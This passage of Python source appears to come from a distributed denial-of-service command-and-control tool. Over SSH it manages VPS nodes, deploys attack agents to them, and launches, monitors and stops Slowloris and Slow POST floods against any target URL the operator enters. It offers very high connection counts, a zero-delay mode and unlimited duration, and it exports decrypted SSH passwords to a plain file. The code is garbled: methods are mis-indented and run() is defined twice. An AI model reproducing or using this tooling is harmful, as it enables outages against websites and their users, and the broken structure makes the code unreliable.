                if "wc -l" in cmd and success and output.strip().isdigit():
                    remaining_procs = int(output.strip())
            
            if remaining_procs is not None and remaining_procs == 0:
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                stop_count += 1
            elif remaining_procs is not None and remaining_procs > 0:
                print(f"{Colors.YELLOW}PARTIAL ({remaining_procs} remaining){Colors.RESET}")
                stop_count += 1
            else:
                print(f"{Colors.RED}FAILED{Colors.RESET}")
        
        self.active_attacks[session_id]['status'] = 'stopped'
        self.active_attacks[session_id]['end_time'] = datetime.now()
        
        print(f"\n{Colors.GREEN}[SUCCESS] Stop command sent to {stop_count}/{len(vps_list)} VPS nodes{Colors.RESET}")
        return True, f"Attack stopped on {stop_count} nodes"
    
    def get_attack_status(self, session_id):
        """Enhanced attack status with better process detection"""
        if session_id not in self.active_attacks:
            return {}
        
        vps_list = self.active_attacks[session_id]['vps_list']
        status = {}
        
        for vps_ip in vps_list:
            # Multiple commands to detect running processes
            commands = [
                "ps aux | grep 'python3.*agent.py' | grep -v grep | wc -l",
                "pgrep -f 'agent.py' 2>/dev/null | wc -l",
                "netstat -an 2>/dev/null | grep ESTABLISHED | wc -l"
            ]
            
            active_processes = 0
            established_connections = 0
            
            for i, cmd in enumerate(commands):
                success, output = self.ssh_manager.execute_command(vps_ip, cmd)
                if success and output.strip().isdigit():
                    value = int(output.strip())
                    if i < 2:  # Process count commands
                        active_processes = max(active_processes, value)
                    else:  # Network connections
                        established_connections = value
            
            # Get additional system info if processes are running
            cpu_usage = ""
            memory_usage = ""
            if active_processes > 0:
                cpu_cmd = "top -bn1 | grep 'python3' | head -1 | awk '{print $9}'"
                success, output = self.ssh_manager.execute_command(vps_ip, cpu_cmd)
                if success and output.strip():
                    cpu_usage = f" (CPU: {output.strip()}%)"
                
                mem_cmd = "free | grep Mem | awk '{print $3/$2 * 100.0}'"
                success, output = self.ssh_manager.execute_command(vps_ip, mem_cmd)
                if success and output.strip():
                    memory_usage = f" (Mem: {float(output.strip()):.1f}%)"
            
            status[vps_ip] = {
                'active_processes': active_processes,
                'status': 'attacking' if active_processes > 0 else 'idle',
                'connections_info': f"({established_connections} conns)" if established_connections > 0 else "",
                'cpu_info': cpu_usage,
                'memory_info': memory_usage
            }
        
        return status

class SlowHTTPTUI:
    def __init__(self):
        self.security_manager = SecurityManager()
        self.db_manager = DatabaseManager()
        self.ssh_manager = SSHManager(self.security_manager)
        self.attack_manager = AttackManager(self.ssh_manager, self.db_manager)
        self.running = True
        
        # Handle Ctrl+C gracefully
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
    
    def _signal_handler(self, sig, frame):
        print(f"\n{Colors.YELLOW}[EXIT] Shutting down C2 server...{Colors.RESET}")
        
        # Stop all active attacks
        for session_id in list(self.attack_manager.active_attacks.keys()):
            self.attack_manager.stop_attack(session_id)
        
        # Close SSH connections
        self.ssh_manager.close_all_connections()
        
        self.running = False
        print(f"{Colors.GREEN}Goodbye!{Colors.RESET}")
        sys.exit(0)

    def bulk_add_vps(self):
    """Bulk add VPS nodes from file or manual input"""
    print(f"\n{Colors.BOLD}BULK ADD VPS NODES{Colors.RESET}")
    print("-" * 25)
    
    print(f"{Colors.CYAN}Format: ip:port:username:password:location{Colors.RESET}")
    print(f"{Colors.CYAN}Example: 192.168.1.100:22:root:password123:USA{Colors.RESET}")
    
    method = input(f"\n{Colors.YELLOW}[1] Enter manually [2] Load from file: {Colors.RESET}").strip()
    
    entries = []
    
    if method == '1':
        print(f"{Colors.YELLOW}Enter VPS details (empty line to finish):{Colors.RESET}")
        while True:
            entry = input("VPS: ").strip()
            if not entry:
                break
            entries.append(entry)
    elif method == '2':
        filename = input("Enter filename: ").strip()
        try:
            with open(filename, 'r') as f:
                entries = [line.strip() for line in f.readlines() if line.strip() and not line.startswith('#')]
        except Exception as e:
            print(f"{Colors.RED}[ERROR] Cannot read file: {e}{Colors.RESET}")
            input("Press Enter to continue...")
            return
    
    if not entries:
        print(f"{Colors.YELLOW}[INFO] No entries provided{Colors.RESET}")
        input("Press Enter to continue...")
        return
    
    success_count = 0
    for entry in entries:
        try:
            parts = entry.split(':')
            if len(parts) < 4:
                print(f"{Colors.RED}[SKIP] Invalid format: {entry}{Colors.RESET}")
                continue
            
            ip = parts[0]
            port = int(parts[1]) if parts[1] else 22
            username = parts[2]
            password = parts[3]
            location = parts[4] if len(parts) > 4 else 'Unknown'
            
            encrypted_password = self.security_manager.encrypt_password(password)
            
            if self.db_manager.add_vps(ip, username, encrypted_password, port, location):
                print(f"{Colors.GREEN}[SUCCESS] Added {ip}{Colors.RESET}")
                success_count += 1
            else:
                print(f"{Colors.RED}[FAILED] {ip} - Already exists or error{Colors.RESET}")
                
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {entry} - {str(e)}{Colors.RESET}")
    
    print(f"\n{Colors.BOLD}Summary: {success_count}/{len(entries)} VPS added successfully{Colors.RESET}")
    input("Press Enter to continue...")

def test_all_connections(self):
    """Enhanced connection testing with better error reporting"""
    vps_list = self.db_manager.get_all_vps()
    
    if not vps_list:
        print(f"{Colors.YELLOW}[INFO] No VPS nodes to test{Colors.RESET}")
        input("Press Enter to continue...")
        return
    
    print(f"\n{Colors.BOLD}TESTING ALL VPS CONNECTIONS{Colors.RESET}")
    print("-" * 50)
    
    online_count = 0
    for vps in vps_list:
        ip, username, encrypted_password, port = vps[1], vps[2], vps[3], vps[4]
        print(f"{Colors.CYAN}[TESTING] {ip}:{port}...{Colors.RESET} ", end="", flush=True)
        
        success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port, timeout=10)
        
        if success:
            # Test command execution
            cmd_success, cmd_output = self.ssh_manager.execute_command(ip, "echo 'test' && python3 --version", timeout=10)
            if cmd_success:
                print(f"{Colors.GREEN}ONLINE{Colors.RESET}")
                self.db_manager.update_vps_status(ip, 'online')
                online_count += 1
            else:
                print(f"{Colors.YELLOW}CONNECTED BUT CMD FAILED{Colors.RESET}")
                self.db_manager.update_vps_status(ip, 'online')
        else:
            print(f"{Colors.RED}OFFLINE - {message[:50]}{Colors.RESET}")
            self.db_manager.update_vps_status(ip, 'offline')
    
    print(f"\n{Colors.BOLD}Summary: {online_count}/{len(vps_list)} VPS online{Colors.RESET}")
    input("\nPress Enter to continue...")

def deploy_all_agents(self):
    """Deploy fixed agents to all online VPS"""
    vps_list = self.db_manager.get_all_vps()
    online_vps = [vps for vps in vps_list if vps[5] == 'online']
    
    if not online_vps:
        print(f"{Colors.YELLOW}[INFO] No online VPS nodes available{Colors.RESET}")
        input("Press Enter to continue...")
        return
    
    print(f"\n{Colors.BOLD}DEPLOYING FIXED AGENTS TO ALL ONLINE VPS{Colors.RESET}")
    print("-" * 50)
    
    successful_deployments = 0
    for vps in online_vps:
        ip = vps[1]
        print(f"{Colors.CYAN}[DEPLOYING] {ip}...{Colors.RESET}")
        
        success, message = self.ssh_manager.deploy_agent(ip)
        
        if success:
            print(f"{Colors.GREEN}[SUCCESS] Agent deployed to {ip}{Colors.RESET}")
            successful_deployments += 1
            self.db_manager.update_vps_status(ip, 'online', agent_deployed=True)
        else:
            print(f"{Colors.RED}[FAILED] {ip}: {message}{Colors.RESET}")
    
    print(f"\n{Colors.GREEN}[SUMMARY] {successful_deployments}/{len(online_vps)} agents deployed successfully{Colors.RESET}")
    input("\nPress Enter to continue...")

def test_single_vps(self):
    """Test single VPS with detailed diagnostics"""
    vps_list = self.db_manager.get_all_vps()
    
    if not vps_list:
        print(f"{Colors.YELLOW}[INFO] No VPS nodes available{Colors.RESET}")
        input("Press Enter to continue...")
        return
    
    print(f"\n{Colors.BOLD}TEST SINGLE VPS{Colors.RESET}")
    print("-" * 20)
    
    for i, vps in enumerate(vps_list, 1):
        print(f"{i}. {vps[1]} ({vps[2]}@{vps[1]}:{vps[4]})")
    
    try:
        choice = self.input_with_prompt("Select VPS number: ")
        if not choice or not choice.isdigit():
            return
        
        idx = int(choice) - 1
        if not (0 <= idx < len(vps_list)):
            print(f"{Colors.RED}Invalid selection{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        vps = vps_list[idx]
        ip, username, encrypted_password, port = vps[1], vps[2], vps[3], vps[4]
        
        print(f"\n{Colors.CYAN}[TESTING] Comprehensive VPS test for {ip}...{Colors.RESET}")
        
        # Test 1: SSH Connection
        print(f"{Colors.CYAN}[TEST 1] SSH Connection...{Colors.RESET} ", end="", flush=True)
        success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
        
        if success:
            print(f"{Colors.GREEN}PASS{Colors.RESET}")
            self.db_manager.update_vps_status(ip, 'online')
            
            # Test 2: Python availability
            print(f"{Colors.CYAN}[TEST 2] Python availability...{Colors.RESET} ", end="", flush=True)
            success, output = self.ssh_manager.execute_command(ip, "python3 --version")
            if success:
                print(f"{Colors.GREEN}PASS - {output}{Colors.RESET}")
                
                # Test 3: Agent deployment
                print(f"{Colors.CYAN}[TEST 3] Agent deployment...{Colors.RESET}")
                success, message = self.ssh_manager.deploy_agent(ip)
                if success:
                    print(f"{Colors.GREEN}[PASS] Agent deployed successfully{Colors.RESET}")
                    self.db_manager.update_vps_status(ip, 'online', agent_deployed=True)
                else:
                    print(f"{Colors.RED}[FAIL] Agent deployment failed: {message}{Colors.RESET}")
            else:
                print(f"{Colors.RED}FAIL - Python3 not available{Colors.RESET}")
                
        else:
            print(f"{Colors.RED}FAIL - {message}{Colors.RESET}")
            self.db_manager.update_vps_status(ip, 'offline')
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
    
    input("\nPress Enter to continue...")

def remove_vps(self):
    """Remove VPS node"""
    vps_list = self.db_manager.get_all_vps()
    
    if not vps_list:
        print(f"{Colors.YELLOW}[INFO] No VPS nodes to remove{Colors.RESET}")
        input("Press Enter to continue...")
        return
    
    print(f"\n{Colors.BOLD}REMOVE VPS NODE{Colors.RESET}")
    print("-" * 20)
    
    for i, vps in enumerate(vps_list, 1):
        print(f"{i}. {vps[1]} ({vps[8] or 'Unknown'})")
    
    try:
        choice = self.input_with_prompt("Select VPS number to remove: ")
        if not choice or not choice.isdigit():
            return
        
        idx = int(choice) - 1
        if 0 <= idx < len(vps_list):
            vps = vps_list[idx]
            
            confirm = input(f"{Colors.YELLOW}Remove VPS {vps[1]}? (y/N): {Colors.RESET}").strip().lower()
            
            if confirm == 'y':
                # Disconnect if connected
                self.ssh_manager.disconnect_vps(vps[1])
                
                # Remove from database
                if self.db_manager.remove_vps(vps[1]):
                    print(f"{Colors.GREEN}[SUCCESS] VPS removed{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[ERROR] Failed to remove VPS{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        else:
            print(f"{Colors.RED}Invalid selection{Colors.RESET}")
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
    
    input("Press Enter to continue...")

def export_vps_list(self):
    """Export VPS list to file"""
    vps_list = self.db_manager.get_all_vps()
    
    if not vps_list:
        print(f"{Colors.YELLOW}[INFO] No VPS to export{Colors.RESET}")
        input("Press Enter to continue...")
        return
    
    filename = input(f"Export filename (default: vps_export.txt): ").strip() or "vps_export.txt"
    
    try:
        with open(filename, 'w') as f:
            f.write("# VPS Export - Format: ip:port:username:password:location\n")
            f.write(f"# Generated on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            for vps in vps_list:
                password = self.security_manager.decrypt_password(vps[3])
                location = vps[8] if vps[8] else "Unknown"
                f.write(f"{vps[1]}:{vps[4]}:{vps[2]}:{password}:{location}\n")
        
        print(f"{Colors.GREEN}[SUCCESS] VPS list exported to {filename}{Colors.RESET}")
        
    except Exception as e:
        print(f"{Colors.RED}[ERROR] Export failed: {e}{Colors.RESET}")
    
    input("Press Enter to continue...")

def launch_attack_menu(self):
    """Launch attack menu"""
    self.clear_screen()
    self.print_banner()
    
    vps_list = self.db_manager.get_all_vps()
    online_vps = [vps for vps in vps_list if vps[5] == 'online']
    
    if not online_vps:
        print(f"{Colors.RED}[ERROR] No online VPS nodes available{Colors.RESET}")
        print(f"{Colors.YELLOW}[INFO] Please add and test VPS nodes first{Colors.RESET}")
        input("Press Enter to continue...")
        return
    
    print(f"{Colors.BOLD}LAUNCH DISTRIBUTED ATTACK{Colors.RESET}")
    print("=" * 50)
    
    print(f"\n{Colors.GREEN}Available VPS Nodes: {len(online_vps)}{Colors.RESET}")
    for i, vps in enumerate(online_vps, 1):
        agent_status = "✓" if len(vps) > 10 and vps[10] else "✗"
        print(f"  {i}. {vps[1]} ({vps[8] or 'Unknown'}) [Agent: {agent_status}]")
    
    try:
        # Target configuration
        print(f"\n{Colors.BOLD}TARGET CONFIGURATION:{Colors.RESET}")
        target_url = self.input_with_prompt("Target URL (e.g., http://target.com): ")
        if not target_url:
            return
        
        # Parse and validate target
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
        
        # Attack type selection
        print(f"\n{Colors.BOLD}ATTACK TYPE:{Colors.RESET}")
        print(f"{Colors.GREEN}[1]{Colors.RESET} Slowloris (Keep connections open)")
        print(f"{Colors.GREEN}[2]{Colors.RESET} Slow POST (R.U.D.Y - Large uploads)")
        
        attack_choice = self.input_with_prompt("Select attack type (1-2): ")
        attack_types = {'1': 'slowloris', '2': 'slow_post'}
        attack_type = attack_types.get(attack_choice)
        
        if not attack_type:
            print(f"{Colors.RED}Invalid attack type{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        # VPS selection
        print(f"\n{Colors.BOLD}VPS SELECTION:{Colors.RESET}")
        vps_choice = self.input_with_prompt("Use all VPS? (Y/n): ", False) or 'y'
        
        if vps_choice.lower() == 'y':
            selected_vps = [vps[1] for vps in online_vps]
        else:
            print("Select VPS numbers (comma-separated, e.g., 1,2,3):")
            selection = self.input_with_prompt("VPS selection: ")
            if not selection:
                return
            
            try:
                indices = [int(x.strip()) - 1 for x in selection.split(',')]
                selected_vps = [online_vps[i][1] for i in indices if 0 <= i < len(online_vps)]
            except (ValueError, IndexError):
                print(f"{Colors.RED}Invalid VPS selection{Colors.RESET}")
                input("Press Enter to continue...")
                return
        
        if not selected_vps:
            print(f"{Colors.RED}No VPS selected{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        # Attack parameters
        print(f"\n{Colors.BOLD}ATTACK PARAMETERS:{Colors.RESET}")
        
        connections_str = self.input_with_prompt("Connections per VPS (default 100): ", False) or "100"
        try:
            connections = int(connections_str)
            if connections > 20000:
                print(f"{Colors.RED}WARNING: Very high connection count ({connections:,}){Colors.RESET}")
                print("This will create massive server load. Continue? (y/N)")
                if input().strip().lower() != 'y':
                    connections = 1000
        except ValueError:
            connections = 100
        
        delay_str = self.input_with_prompt("Delay between packets (default 15): ", False) or "15"
        try:
            delay = int(delay_str)
            if delay == 0:
                print(f"{Colors.RED}ZERO DELAY MODE: Maximum aggression enabled{Colors.RESET}")
        except ValueError:
            delay = 15
        
        duration_str = self.input_with_prompt("Attack duration in seconds (0 for unlimited): ", False) or "0"
        try:
            duration = int(duration_str)
        except ValueError:
            duration = 0
        
        # Attack summary
        print(f"\n{Colors.BOLD}ATTACK SUMMARY:{Colors.RESET}")
        print(f"Target: {Colors.YELLOW}{target_url}{Colors.RESET}")
        attack_name = "Slowloris" if attack_type == "slowloris" else "Slow POST (R.U.D.Y)"
        print(f"Attack Type: {Colors.YELLOW}{attack_name}{Colors.RESET}")
        print(f"VPS Nodes: {Colors.YELLOW}{len(selected_vps)}{Colors.RESET}")
        print(f"Connections per VPS: {Colors.YELLOW}{connections:,}{Colors.RESET}")
        print(f"Total Connections: {Colors.YELLOW}{len(selected_vps) * connections:,}{Colors.RESET}")
        print(f"Packet Delay: {Colors.YELLOW}{delay}s{Colors.RESET}")
        print(f"Duration: {Colors.YELLOW}{'Unlimited' if duration == 0 else f'{duration}s'}{Colors.RESET}")
        
        if attack_type == 'slow_post':
            estimated_data = len(selected_vps) * connections * 50  # Avg 50MB per connection
            print(f"Estimated Total Data: {Colors.RED}{estimated_data:,} MB{Colors.RESET}")
        
        # Final confirmation
        print(f"\n{Colors.RED}LAUNCH ATTACK? (y/N): {Colors.RESET}", end="")
        confirm = input().strip().lower()
        
        if confirm != 'y':
            print(f"{Colors.YELLOW}[CANCELLED] Attack cancelled{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        # Create attack session
        session_name = f"Attack_{attack_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        target_host = target_url.replace('http://', '').replace('https://', '').split('/')[0]
        
        parameters = {
            'connections': connections,
            'delay': delay,
            'duration': duration
        }
        
        session_id = self.db_manager.create_attack_session(
            session_name, target_url, target_host, attack_type, selected_vps, parameters
        )
        
        # Launch attack
        success = self.attack_manager.launch_attack(
            session_id, target_url, attack_type, selected_vps, parameters
        )
        
        if success:
            print(f"\n{Colors.GREEN}[SUCCESS] DISTRIBUTED ATTACK LAUNCHED SUCCESSFULLY!{Colors.RESET}")
            print(f"{Colors.CYAN}[INFO] Session ID: {session_id}{Colors.RESET}")
            
            # Auto-start monitoring
            input(f"\n{Colors.YELLOW}Press Enter to start real-time monitoring...{Colors.RESET}")
            self.monitor_attack(session_id)
        else:
            print(f"{Colors.RED}[ERROR] Failed to launch attack{Colors.RESET}")
            input("Press Enter to continue...")
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        input("Press Enter to continue...")
    except Exception as e:
        print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
        input("Press Enter to continue...")

def monitor_attack(self, session_id=None):
    """Monitor active attacks"""
    if session_id is None:
        # List active attacks
        if not self.attack_manager.active_attacks:
            print(f"{Colors.YELLOW}[INFO] No active attacks to monitor{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}ACTIVE ATTACKS:{Colors.RESET}")
        for sid, attack_info in self.attack_manager.active_attacks.items():
            attack_name = "Slowloris" if attack_info['attack_type'] == "slowloris" else "Slow POST"
            print(f"Session {sid}: {attack_info['target_host']} ({attack_name})")
        
        try:
            session_input = self.input_with_prompt("Enter session ID to monitor: ")
            if not session_input or not session_input.isdigit():
                return
            session_id = int(session_input)
        except (ValueError, KeyboardInterrupt):
            return
    
    if session_id not in self.attack_manager.active_attacks:
        print(f"{Colors.RED}[ERROR] Session not found{Colors.RESET}")
        input("Press Enter to continue...")
        return
    
    print(f"\n{Colors.GREEN}[MONITORING] Starting real-time attack monitoring...{Colors.RESET}")
    print(f"{Colors.YELLOW}[CONTROLS] Press Ctrl+C to stop monitoring{Colors.RESET}")
    time.sleep(2)
    
    try:
        while session_id in self.attack_manager.active_attacks:
            status_data = self.attack_manager.get_attack_status(session_id)
            attack_info = self.attack_manager.active_attacks[session_id]
            
            # Clear screen and display status
            self.clear_screen()
            
            print(f"{Colors.BOLD}{'='*95}{Colors.RESET}")
            print(f"{Colors.BOLD}{Colors.RED}           DISTRIBUTED SLOW HTTP ATTACK - LIVE MONITORING{Colors.RESET}")
            print(f"{Colors.BOLD}{'='*95}{Colors.RESET}")
            
            attack_name = "SLOWLORIS" if attack_info.get('attack_type') == 'slowloris' else "SLOW POST (R.U.D.Y)"
            print(f"\n{Colors.YELLOW}[SESSION] {session_id} - {attack_name}{Colors.RESET}")
            print(f"{Colors.CYAN}[TARGET]  {attack_info.get('target_host', 'Unknown')}{Colors.RESET}")
            
            if attack_info.get('start_time'):
                uptime = datetime.now() - attack_info['start_time']
                print(f"{Colors.GREEN}[UPTIME]  {str(uptime).split('.')[0]}{Colors.RESET}")
            
            # Parameters display
            params = attack_info.get('parameters', {})
            print(f"{Colors.PURPLE}[PARAMS]  Connections: {params.get('connections', 'N/A'):,} | Delay: {params.get('delay', 'N/A')}s{Colors.RESET}")
            
            print(f"\n{Colors.BOLD}VPS STATUS:{Colors.RESET}")
            print(f"{'IP Address':<15} {'Status':<12} {'Processes':<10} {'Connections':<15} {'Resources':<20} {'Last Check'}")
            print("-" * 100)
            
            total_processes = 0
            active_vps = 0
            
            for vps_ip, data in status_data.items():
                processes = data.get('active_processes', 0)
                status = "ATTACKING" if processes > 0 else "IDLE"
                color = Colors.GREEN if processes > 0 else Colors.RED
                conn_info = data.get('connections_info', '')
                cpu_info = data.get('cpu_info', '')
                mem_info = data.get('memory_info', '')
                
                total_processes += processes
                if processes > 0:
                    active_vps += 1
                
                resource_info = f"{cpu_info}{mem_info}".strip()
                
                print(f"{vps_ip:<15} {color}{status:<12}{Colors.RESET} {processes:<10} {conn_info:<15} {resource_info:<20} {datetime.now().strftime('%H:%M:%S')}")
            
            print(f"\n{Colors.BOLD}ATTACK STATISTICS:{Colors.RESET}")
            print(f"{Colors.YELLOW}Active VPS Nodes: {active_vps}/{len(status_data)}{Colors.RESET}")
            print(f"{Colors.YELLOW}Total Attack Processes: {total_processes}{Colors.RESET}")
            
            est_connections = total_processes * params.get('connections', 100)
            print(f"{Colors.RED}Estimated Total Connections: {est_connections:,}{Colors.RESET}")
            
            if attack_info.get('attack_type') == 'slow_post':
                est_data_gb = (est_connections * 50) / 1024
                print(f"{Colors.RED}Estimated Data Transfer: {est_data_gb:.1f} GB{Colors.RESET}")
            
            print(f"\n{Colors.PURPLE}[CONTROLS] Press Ctrl+C to stop monitoring{Colors.RESET}")
            
            time.sleep(5)
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[INFO] Monitoring stopped{Colors.RESET}")
        
        # Ask if user wants to stop the attack
        try:
            stop_attack = input(f"{Colors.RED}Stop the attack? (y/N): {Colors.RESET}").strip().lower()
            if stop_attack == 'y':
                self.attack_manager.stop_attack(session_id)
        except KeyboardInterrupt:
            pass
    
    input("\nPress Enter to continue...")

# Update the run method to include the new menu options
def run(self):
    while self.running:
        try:
            self.clear_screen()
            self.print_banner()
            self.print_menu()
            
            choice = input().strip()
            
            if choice == '1':
                self.vps_management_menu()
            elif choice == '2':
                self.launch_attack_menu()
            elif choice == '3':
                self.monitor_attack()
            elif choice == '4':
                print(f"{Colors.YELLOW}Attack History feature - implement based on your needs{Colors.RESET}")
                input("Press Enter to continue...")
            elif choice == '5':
                print(f"{Colors.YELLOW}System Status feature - implement based on your needs{Colors.RESET}")
                input("Press Enter to continue...")
            elif choice == '6':
                print(f"{Colors.YELLOW}Advanced Options feature - implement based on your needs{Colors.RESET}")
                input("Press Enter to continue...")
            elif choice == '0':
                print(f"{Colors.YELLOW}[EXIT] Shutting down C2 server...{Colors.RESET}")
                break
            else:
                print(f"{Colors.RED}Invalid option{Colors.RESET}")
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[EXIT] Shutting down...{Colors.RESET}")
            break
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            input("Press Enter to continue...")
    
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_banner(self):
        banner = f"""{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                    DISTRIBUTED SLOW HTTP TESTING C2                         ║
║                        COMPLETE FIXED EDITION v3.0                          ║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.RED}{Colors.BOLD}⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️{Colors.RESET}
{Colors.RED}   Unauthorized use against systems you don't own is ILLEGAL!{Colors.RESET}

"""
        print(banner)
    
    def print_menu(self):
        menu = f"""
{Colors.BOLD}MAIN MENU:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} VPS Management
{Colors.GREEN}[2]{Colors.RESET} Launch Distributed Attack
{Colors.GREEN}[3]{Colors.RESET} Monitor Active Attacks  
{Colors.GREEN}[4]{Colors.RESET} Attack History & Logs
{Colors.GREEN}[5]{Colors.RESET} System Status
{Colors.GREEN}[6]{Colors.RESET} Advanced Options
{Colors.GREEN}[0]{Colors.RESET} Exit

{Colors.YELLOW}Select option (0-6): {Colors.RESET}"""
        print(menu)
    
    def input_with_prompt(self, prompt, required=True):
        while True:
            try:
                value = input(f"{Colors.CYAN}{prompt}{Colors.RESET}").strip()
                if not required or value:
                    return value
                print(f"{Colors.RED}This field is required{Colors.RESET}")
            except KeyboardInterrupt:
                return None
    
    def vps_management_menu(self):
        while self.running:
            self.clear_screen()
            self.print_banner()
            
            vps_list = self.db_manager.get_all_vps()
            
            print(f"{Colors.BOLD}VPS MANAGEMENT{Colors.RESET}")
            print("=" * 50)
            
            if vps_list:
                print(f"\n{'ID':<4} {'IP Address':<15} {'Username':<12} {'Status':<10} {'Agent':<8} {'Location':<15} {'Last Seen'}")
                print("-" * 85)
                
                for vps in vps_list:
                    status_color = Colors.GREEN if vps[5] == 'online' else Colors.RED
                    agent_color = Colors.GREEN if len(vps) > 10 and vps[10] else Colors.RED
                    agent_status = "YES" if len(vps) > 10 and vps[10] else "NO"
                    last_seen = vps[7][:19] if vps[7] else 'Never'
                    location = vps[8] if vps[8] else 'Unknown'
                    
                    print(f"{vps[0]:<4} {vps[1]:<15} {vps[2]:<12} {status_color}{vps[5]:<10}{Colors.RESET} {agent_color}{agent_status:<8}{Colors.RESET} {location:<15} {last_seen}")
            else:
                print(f"\n{Colors.YELLOW}No VPS nodes configured{Colors.RESET}")
            
            menu = f"""
{Colors.BOLD}VPS OPERATIONS:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} Add VPS Node
{Colors.GREEN}[2]{Colors.RESET} Bulk Add VPS
{Colors.GREEN}[3]{Colors.RESET} Test All Connections
{Colors.GREEN}[4]{Colors.RESET} Deploy Fixed Agents to All
{Colors.GREEN}[5]{Colors.RESET} Remove VPS Node
{Colors.GREEN}[6]{Colors.RESET} Test Single VPS
{Colors.GREEN}[7]{Colors.RESET} Export VPS List
{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu

{Colors.YELLOW}Select option (0-7): {Colors.RESET}"""
            
            print(menu)
            choice = input().strip()
            
            if choice == '1':
                self.add_vps()
            elif choice == '2':
                self.bulk_add_vps()
            elif choice == '3':
                self.test_all_connections()
            elif choice == '4':
                self.deploy_all_agents()
            elif choice == '5':
                self.remove_vps()
            elif choice == '6':
                self.test_single_vps()
            elif choice == '7':
                self.export_vps_list()
            elif choice == '0':
                break
            else:
                print(f"{Colors.RED}Invalid option{Colors.RESET}")
                time.sleep(1)
    
    def add_vps(self):
        print(f"\n{Colors.BOLD}ADD NEW VPS NODE{Colors.RESET}")
        print("-" * 25)
        
        try:
            ip = self.input_with_prompt("IP Address: ")
            if not ip:
                return
            
            username = self.input_with_prompt("SSH Username: ")
            if not username:
                return
            
            password = self.input_with_prompt("SSH Password: ")
            if not password:
                return
            
            port = self.input_with_prompt("SSH Port (default 22): ", False) or "22"
            try:
                port = int(port)
            except ValueError:
                print(f"{Colors.RED}Invalid port number{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            location = self.input_with_prompt("Location (optional): ", False) or "Unknown"
            
            encrypted_password = self.security_manager.encrypt_password(password)
            
            vps_id = self.db_manager.add_vps(ip, username, encrypted_password, port, location)
            if vps_id:
                print(f"{Colors.GREEN}[SUCCESS] VPS added to database{Colors.RESET}")
                
                # Test connection
                print(f"{Colors.YELLOW}[INFO] Testing connection...{Colors.RESET}")
                success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
                
                status = 'online' if success else 'offline'
                self.db_manager.update_vps_status(ip, status)
                
                if success:
                    print(f"{Colors.GREEN}[SUCCESS] Connection test passed{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[ERROR] Connection test failed: {message}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[ERROR] VPS already exists or database error{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def run(self):
        while self.running:
            try:
                self.clear_screen()
                self.print_banner()
                self.print_menu()
                
                choice = input().strip()
                
                if choice == '1':
                    self.vps_management_menu()
                elif choice == '2':
                    print(f"{Colors.YELLOW}Launch Attack feature - implement based on your needs{Colors.RESET}")
                    input("Press Enter to continue...")
                elif choice == '3':
                    print(f"{Colors.YELLOW}Monitor Attacks feature - implement based on your needs{Colors.RESET}")
                    input("Press Enter to continue...")
                elif choice == '4':
                    print(f"{Colors.YELLOW}Attack History feature - implement based on your needs{Colors.RESET}")
                    input("Press Enter to continue...")
                elif choice == '5':
                    print(f"{Colors.YELLOW}System Status feature - implement based on your needs{Colors.RESET}")
                    input("Press Enter to continue...")
                elif choice == '6':
                    print(f"{Colors.YELLOW}Advanced Options feature - implement based on your needs{Colors.RESET}")
                    input("Press Enter to continue...")
                elif choice == '0':
                    print(f"{Colors.YELLOW}[EXIT] Shutting down C2 server...{Colors.RESET}")
                    break
                else:
                    print(f"{Colors.RED}Invalid option{Colors.RESET}")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[EXIT] Shutting down...{Colors.RESET}")
                break
            except Exception as e:
                print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
                input("Press Enter to continue...")

def main():
    # Check Python version
    if sys.version_info < (3, 6):
        print("Python 3.6+ required")
        sys.exit(1)
    
    # Check dependencies
    try:
        import paramiko
